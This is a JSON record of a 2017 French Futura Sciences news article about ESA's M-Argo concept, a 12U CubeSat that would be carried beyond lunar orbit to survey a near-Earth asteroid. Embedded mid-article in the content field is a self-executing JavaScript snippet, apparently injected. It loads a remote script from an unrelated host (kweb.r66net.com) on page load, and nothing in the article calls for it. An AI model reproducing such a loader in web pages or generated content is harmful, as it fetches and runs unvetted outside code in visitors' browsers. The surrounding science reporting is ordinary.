{"title": "Un CubeSat va partir a l'assaut d'un asteroide : une premiere", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-11-20", "content": "Aujourd'hui, les minuscules CubeSat sont surtout cantonnes a des missions d'observation de la Terre et a la demonstration de nouvelles technologies. La maturite de cette technologie permet desormais d'envisager d'ici quelques annees des missions au-dela de l'orbite basse. L'Agence spatiale europeenne etudie meme un CubeSat qui rejoindrait un asteroide pour l'etudier de pres.  Ce qu'il faut retenir La miniaturisation des composants spatiaux rend possible l'utilisation de CubeSat pour des missions d'exploration. M-Argo pourrait prefigurer une flotte de CubeSat envoyee pour realiser un sondage inedit des asteroides proches de la Terre, y compris des plus petits d'entre eux. La maturite des CubeSat et la miniaturisation des composants spatiaux representent une opportunite technologique pour les societes du <<  New Space  >>. Les scientifiques et les agences spatiales s'y interessent egalement, notamment en raison de leurs faibles couts et parce qu'ils peuvent realiser des missions complementaires a celles de gros satellites. Ainsi, l'Agence spatiale europeenne etudie plusieurs concepts de missions s'appuyant sur l'utilisation de CubeSat pour fonctionner au-dela de l' orbite  basse. Tres petits, ils ne peuvent pas tout faire comme les grands. Sur certains points, ils font aussi bien ou differemment mais sur d'autres, des solutions alternatives sont a trouver. Compte tenu de cette petite taille, la puissance comme l' energie  disponible pour faire fonctionner les servitudes (communication,  propulsion electrique , survie dans l'espace lointain) et les instruments sont forcement limitees. Pour attenuer ces contraintes techniques, voire s'en affranchir, l'idee de l' ESA  est d'utiliser des satellites  hotes  qui mettraient en commun leur servitudes et ameneraient des CubeSat aussi pres que possible de leur destination cible. Le saviez-vous ? CubeSat est un standard de nanosatellites, cree en 1999 par les universites CalPoly et Stanford en Californie, constitues d'une ou plusieurs unites d'une taille et d'une masse fixees : respectivement 10 x 10 x 10 centimetres et 1,33 kilogramme. Le format le plus couramment utilise est le CubeSat de 3 unites (CubeSat 3U). M-Argo en aura 12. Parmi les projets a l'etude, l'ESA a recemment communique sur la mission M-Argo ( Miniaturized Asteroid Remote Geophysical Observer ). Pousse par le  Concurrent Design Facility , un bureau d'etudes du Centre europeen de recherche et des techniques spatiales de l'ESA ( ESTEC ), M-Argo a pour objectif d'etudier un  asteroide  a l'aide d'une camera multispectrale et un altimetre  laser . Pour rejoindre sa cible, M-Argo ne fera pas le voyage depuis la  Terre . Il sera amene, a bord d'un satellite hote, au-dela de l'orbite lunaire ou a un des  points de Lagrange  terrestres et terminera son voyage en utilisant ses propres servitudes et systeme de propulsion electrique. L'exploration et la surveillance futures des asteroides proches de la Terre pourraient etre realisees par une flottille de CubeSats. (c) ESA, ScienceOffice.org Pour concevoir un CubeSat, il faut penser autrement << Pour l'instant, M-Argo n'est qu'un concept, mais qui nous fournit des informations precieuses sur les developpements technologiques a mettre en place pour une demonstration en vol dans un avenir proche >> , commente Roger Walker, responsable des Technology CubeSats de l'ESA. Et d'ajouter que  << cela couterait environ un dixieme de la plus petite mission dans l'espace lointain, democratisant l'exploration spatiale au-dela de la Terre, la mettant a la portee de nouveaux acteurs, de la meme maniere que les CubeSat ont deja ouvert l'orbite terrestre basse >>  a de nouveaux acteurs offrant de nouveaux services et l' emergence  d'un nouvel <<  ecosysteme  >>, notamment dans le  secteur commercial de l'observation de la Terre .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Avec une reduction des couts aussi significatives, il est possible d'envoyer de  << 10 a 20 CubeSat pour explorer differents asteroides et realiser une vaste etude quantitative sur la population des objets proches de la Terre, afin de mieux les connaitre (science) et identifier des  ressources naturelles  susceptibles d'etres exploitees a l'avenir >> . Pour devenir realite, M-Argo a besoin d'une propulsion electrique solaire miniaturisee, d'une antenne plate pour augmenter le gain du signal  radio  et d'un transpondeur en bande X pour soutenir la communication vers les stations au sol terrestres et comme moyen de navigation spatiale. Il reste aussi a identifier une opportunite de lancement appropriee a l'horizon 2021, date a laquelle le satellite pourrait etre pret. Les scientifiques s'y preparent et une liste de 83 asteroides cibles suffisamment proches de la Terre et accessibles a un CubeSat est deja a l'etude. Certains de ces asteroides mesurent 300 metres ou plus, mais la plupart sont petits, environ 50 metres, et ceux-la n'ont jamais ete approches. ", "theme": "sciences"}